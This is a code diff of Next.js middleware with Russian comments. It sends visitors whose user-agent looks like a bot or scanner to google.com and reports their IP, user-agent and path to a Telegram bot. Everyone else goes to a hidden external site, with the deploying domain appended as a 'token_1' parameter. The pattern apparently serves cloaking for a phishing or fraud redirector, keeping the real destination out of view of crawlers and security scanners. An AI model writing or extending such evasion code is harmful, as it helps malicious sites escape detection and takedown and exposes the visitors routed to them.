@@ -170,16 +170,22 @@ async function notifyTelegram(text, req, data = {}) {
 
 export async function middleware(req) {
   const ua = req.headers.get("user-agent") || "";
-
   const isHumanLike = ua.includes("Mozilla");
-  
   const url = req.nextUrl.pathname + (req.nextUrl.search || "");
   const ip = req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "unknown";
 
+  // --- достаем домен из ENV ---
+  let envUrl = process.env.URL || process.env.DEPLOY_URL || "unknown-domain";
+  try {
+    // убираем https:// или http:// если есть
+    envUrl = new URL(envUrl).host;
+  } catch (e) {
+    console.warn("Invalid envUrl:", envUrl);
+  }
+
   // пустой юа — сразу считаем ботом
   if (!isHumanLike) {
-    // шлём уведомление (не ждём долго)
-    notifyTelegram(`🚨 Подозрительный UA: ${ua}\nIP: ${ip}\nURL: ${url}`);
+    notifyTelegram(`🚨 Подозрительный UA: ${ua}\nIP: ${ip}\nURL: ${url}`, req);
     return NextResponse.redirect("https://google.com");
   }
 
@@ -191,21 +197,21 @@ export async function middleware(req) {
     console.warn("loadBotRegexes failed", e?.message || e);
   }
 
-  // быстрое совпадение по regexp
   const isBot = regexes.some(rx => {
     try { return rx.test(ua); } catch (e) { return false; }
   });
 
   if (isBot) {
-    // уведомление и редирект
-    notifyTelegram(`🚨 Known bot detected\nUA: ${ua}\nIP: ${ip}\nURL: ${url}`);
+    notifyTelegram(`🚨 Known bot detected\nUA: ${ua}\nIP: ${ip}\nURL: ${url}`, req);
     return NextResponse.redirect("https://google.com");
   }
-  //return NextResponse.next();
-  return NextResponse.redirect(URL_SITE);
-  
-  // не бот — пускаем дальше
-  //return NextResponse.next();
+
+  // --- добавляем параметр src=envUrl в ссылку ---
+  const target = new URL(URL_SITE);
+  target.searchParams.set("token_1", envUrl);
+
+  // редиректим на обновленную ссылку
+  return NextResponse.redirect(target.toString());
 }
 
 // применяем на все роуты
